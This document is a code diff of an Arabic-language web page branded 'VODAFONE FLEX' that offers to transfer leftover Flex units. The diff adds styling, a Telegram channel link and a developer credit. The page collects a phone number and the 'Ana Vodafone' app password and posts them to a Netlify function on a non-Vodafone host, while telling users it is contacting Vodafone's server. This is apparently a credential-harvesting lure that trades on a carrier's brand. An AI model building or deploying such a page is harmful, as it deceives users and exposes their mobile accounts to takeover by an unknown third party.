@@ -7,20 +7,68 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%); color: white; font-family: sans-serif; }
-        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; }
-        .btn-vodafone { background: linear-gradient(45deg, #e60000, #ff4d4d); transition: all 0.3s ease; }
+        body {
+            background: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%);
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+        }
+        .btn-vodafone {
+            background: linear-gradient(45deg, #e60000, #ff4d4d);
+            transition: all 0.3s ease;
+        }
+        .btn-vodafone:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(230, 0, 0, 0.5);
+        }
     </style>
 </head>
 <body class="min-h-screen flex flex-col items-center justify-center p-4">
+
     <div class="glass w-full max-w-md p-8 text-center shadow-2xl">
-        <h1 class="text-3xl font-extrabold mb-6">VODAFONE <span class="text-red-600">FLEX</span></h1>
-        <div class="space-y-5">
-            <input type="text" id="phone" placeholder="رقم الهاتف" class="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4">
-            <input type="password" id="pass" placeholder="كلمة السر" class="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4">
-            <button onclick="startTransfer()" id="mainBtn" class="btn-vodafone w-full py-4 rounded-xl font-bold">ترحيل الآن</button>
+        <div class="mb-8">
+            <div class="inline-block p-4 rounded-full bg-red-600/10 mb-4">
+                <i class="fa-solid fa-bolt-lightning text-5xl text-red-600"></i>
+            </div>
+            <h1 class="text-3xl font-extrabold tracking-tighter">VODAFONE <span class="text-red-600">FLEX</span></h1>
+            <p class="text-gray-400 mt-2 text-sm">ترحيل الفليكسات المتبقية لعام 2026</p>
         </div>
-        <div id="status" class="mt-6 hidden p-4 rounded-xl text-sm"></div>
+
+        <div class="space-y-5">
+            <div class="text-right">
+                <label class="block text-xs text-gray-500 mr-2 mb-1">رقم الهاتف</label>
+                <input type="text" id="phone" placeholder="010xxxxxxxx" 
+                    class="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600 transition-all">
+            </div>
+            
+            <div class="text-right">
+                <label class="block text-xs text-gray-500 mr-2 mb-1">كلمة السر (تطبيق أنا فودافون)</label>
+                <input type="password" id="pass" placeholder="••••••••" 
+                    class="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600 transition-all">
+            </div>
+
+            <button onclick="startTransfer()" id="mainBtn" class="btn-vodafone w-full py-4 rounded-xl font-bold text-lg shadow-lg">
+                ترحيل الآن
+            </button>
+        </div>
+
+        <div id="status" class="mt-6 hidden p-4 rounded-xl text-sm font-medium"></div>
+
+        <div class="mt-10 pt-6 border-t border-white/10 flex flex-col gap-4">
+            <a href="https://t.me/+cRVrqeC1ZaxmNGY0" target="_blank" 
+               class="bg-[#229ED9]/10 hover:bg-[#229ED9]/20 text-[#229ED9] py-2 rounded-lg flex items-center justify-center gap-2 transition-colors">
+                <i class="fa-brands fa-telegram text-xl"></i> قناة التحديثات
+            </a>
+            <div class="text-gray-500 text-xs">
+                بواسطة المطور: 
+                <a href="https://t.me/K0BBTAN" class="text-red-500 font-bold hover:underline transition-all">@K0BBTAN</a>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -30,12 +78,15 @@
             const status = document.getElementById('status');
             const btn = document.getElementById('mainBtn');
 
-            if (!phone || !password) return alert("دخل البيانات!");
+            if (!phone || !password) return alert("يا بطل دخل البيانات الأول!");
 
+            // إعادة ضبط الشكل عند الضغط
             status.classList.remove('hidden', 'bg-red-500/10', 'text-red-400', 'bg-green-500/10', 'text-green-400');
-            status.innerHTML = "جاري الاتصال...";
-            status.classList.add('block');
+            status.classList.add('block', 'bg-white/5', 'text-gray-300', 'animate-pulse');
+            status.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin ml-2"></i> جاري الاتصال بسيرفر فودافون...`;
+            
             btn.disabled = true;
+            btn.style.opacity = "0.5";
 
             try {
                 const response = await fetch('/.netlify/functions/transfer', {
@@ -44,19 +95,25 @@
                     body: JSON.stringify({ phone, password })
                 });
                 
-                const data = await response.json();
+                // قراءة الرد كـ JSON
+                const result = await response.json();
+                
+                status.classList.remove('animate-pulse', 'bg-white/5', 'text-gray-300');
+
                 if (response.ok) {
                     status.classList.add('bg-green-500/10', 'text-green-400');
-                    status.innerHTML = data.message || "تم بنجاح";
+                    status.innerHTML = `✅ ${result.message || "تمت العملية بنجاح"}`;
                 } else {
                     status.classList.add('bg-red-500/10', 'text-red-400');
-                    status.innerHTML = data.message || "حدث خطأ في البيانات";
+                    status.innerHTML = `❌ ${result.message || "حدث خطأ في البيانات"}`;
                 }
             } catch (err) {
+                status.classList.remove('animate-pulse', 'bg-white/5', 'text-gray-300');
                 status.classList.add('bg-red-500/10', 'text-red-400');
-                status.innerHTML = "❌ مشكلة في الشبكة أو السيرفر";
+                status.innerHTML = "❌ مشكلة في الاتصال بالسيرفر، حاول تاني";
             } finally {
                 btn.disabled = false;
+                btn.style.opacity = "1";
             }
         }
     </script>
